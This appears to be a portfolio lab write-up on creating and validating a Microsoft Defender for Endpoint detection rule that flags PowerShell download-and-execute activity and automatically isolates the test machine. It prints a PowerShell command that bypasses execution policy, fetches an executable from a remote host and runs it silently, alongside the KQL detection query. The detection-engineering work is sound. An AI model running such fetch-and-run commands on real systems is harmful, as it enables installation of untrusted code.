# Remote Code Execution Detection via PowerShell (MDE)

This demonstration covers the creation and validation of a custom detection rule in **Microsoft Defender for Endpoint (MDE)** designed to identify potential **Remote Code Execution (RCE)** via PowerShell. Once triggered, the detection rule automatically isolates the affected virtual machine to prevent further malicious activity.

The rule targets behavior commonly associated with RCE, where PowerShell is used to download and execute an external file — in this case, a silent installation of the 7-Zip application using `Invoke-WebRequest` and `Start-Process`.

The demonstration will use a virutal machine named `io-test-vm`.

---

## PowerShell Command Used for RCE Simulation

The following command simulates attacker behavior by downloading and executing a file via PowerShell:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command `
"Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' `
-OutFile 'C:\ProgramData\7z2408-x64.exe'; `
Start-Process 'C:\ProgramData\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```

---

## Building the Detection Query

Within the **Advanced Hunting** dashboard in MDE, a KQL query is written to identify suspicious PowerShell behavior. The query focuses on identifying executions involving `Invoke-WebRequest` and `Start-Process`, particularly from non-system accounts on the `io-test-vm` machine.

```kql
let target_machine = "io-test-vm";
DeviceProcessEvents
| where DeviceName == target_machine
| where AccountName != "system"
| where InitiatingProcessCommandLine has_all ("Invoke-WebRequest", "Start-Process")
| order by Timestamp desc 
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/bc663ad5-6843-4123-a435-c6836fe1c9fb" width="600"/>
</p>

---

## Defining a Detection Rule

MDE provides the option to convert the query into a detection rule, allowing for future instances of the same behaviour to trigger alerts and initiate response actions.

<p align="center">
  <img src="https://github.com/user-attachments/assets/de92a563-158b-457d-ba9a-85426ec89270" width="250"/>
</p>

### Configuration Overview

Required fields such as rule name, severity level, and description are specified to define how the rule should behave and be organized within the system.

<p align="center">
  <img src="https://github.com/user-attachments/assets/20f0f0ae-070f-4cb6-be7c-1f2390590022" width="650"/>
</p>

### Mapping Impacted Entities

Based on the query logic, the rule automatically links alerts to the relevant device or user information.

<p align="center">
  <img src="https://github.com/user-attachments/assets/a368a4a3-9269-4163-b150-58e02d4391cf" width="600"/>
</p>

### Assigning Automated Responses

Automated actions are configured to take effect upon rule activation. In this case, device isolation is selected to contain the threat, and an investigation package is collected to support forensic review.

<p align="center">
  <img src="https://github.com/user-attachments/assets/2bb45148-feb5-402b-a23e-728d35106224" width="600"/>
</p>

> **Note:** Full isolation is recommended to prevent further malicious activity.

### Finalizing the Rule

All configurations are reviewed prior to submission. Once confirmed, the detection rule is activated.

<p align="center">
  <img src="https://github.com/user-attachments/assets/9b780a4d-6d4f-43d2-a19d-1317fae314dd" width="550"/>
</p>

---

## Monitoring the Detection Rule

Once active, the detection rule appears in the **Detection Rules** dashboard. Details such as alert history, associated entities, and response actions can be reviewed from this view.

<p align="center">
  <img src="https://github.com/user-attachments/assets/270233a8-f4e9-4ab4-9aaa-0bb6ef50bac5" width="450"/>
  <img src="https://github.com/user-attachments/assets/8fc98915-4082-45e0-8f3d-0bfebe949b3f" width="750"/>
</p>

---

## Validating Detection and Response

To validate the detection rule, the PowerShell command is run on `io-test-vm`.

<p align="center">
  <img src="https://github.com/user-attachments/assets/6ef9afc5-46f1-4532-bf6f-5b54d5296498" width="900"/>
</p>

---

## Reviewing Alert Details

When the rule is triggered, MDE generates an alert that includes the impacted device, the automated actions taken (e.g., isolation), and the full timeline of observed activity.

<p align="center">
  <img src="https://github.com/user-attachments/assets/9e7f0edf-a667-4fdf-97c6-92bbc763a871" width="1000"/>
  <img src="https://github.com/user-attachments/assets/5f3ad75f-74d2-4a92-a14a-4ca8313db507" width="1000"/>
  <img src="https://github.com/user-attachments/assets/138dae23-4aaf-4620-919e-17f011318aea" width="850"/>
  <img src="https://github.com/user-attachments/assets/3ee8a503-a8f0-41b8-b82c-83a68478b77f" width="850"/>
</p>

---

## Confirming Isolation and Recovery

Following isolation, any login attempt to the compromised device fails, confirming containment. The device can later be released from isolation manually if no further threats are detected.

<p align="center">
  <img src="https://github.com/user-attachments/assets/149f887d-4495-400c-89aa-6c67db695c23" width="450"/>
  <img src="https://github.com/user-attachments/assets/4209f01d-8f68-4859-84b7-453c4a65e484" width="550"/>
  <img src="https://github.com/user-attachments/assets/d10b98be-e412-4d1f-aa03-0188e15620fd" width="450"/>
</p>

---

## Summary

This lab demonstrates a complete workflow for creating a detection rule to identify and respond to potential remote code execution activity in Microsoft Defender for Endpoint. It includes simulating an RCE attack using PowerShell, creating a detection rule using KQL, and validating automated isolation as a containment response. This project showcases skills in threat simulation, detection engineering, and endpoint response automation.

---

**Author:** Gabriel Espinoza



